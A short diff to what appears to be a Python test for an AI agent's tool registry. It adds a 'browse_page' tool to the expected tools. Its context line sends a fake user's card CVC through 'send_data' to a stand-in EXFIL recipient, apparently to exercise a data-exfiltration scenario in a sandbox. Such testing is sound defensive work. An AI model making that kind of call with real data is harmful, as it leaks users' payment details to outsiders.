@@ -183,7 +183,7 @@ def fake_aws(monkeypatch):
 
 def test_tools_are_registered_on_the_agent(fake_aws, no_network):
     agent = build_agent(Settings(), tools=agent_tools())
-    assert set(agent.tool_names) == {"get_user_profile", "send_data"}
+    assert set(agent.tool_names) == {"browse_page", "get_user_profile", "send_data"}
 
     # Call through the agent's tool registry, the same path a model's tool call takes.
     agent.tool.send_data(recipient=EXFIL, data={"cvc": FAKE_PROFILE["card_cvc"]})
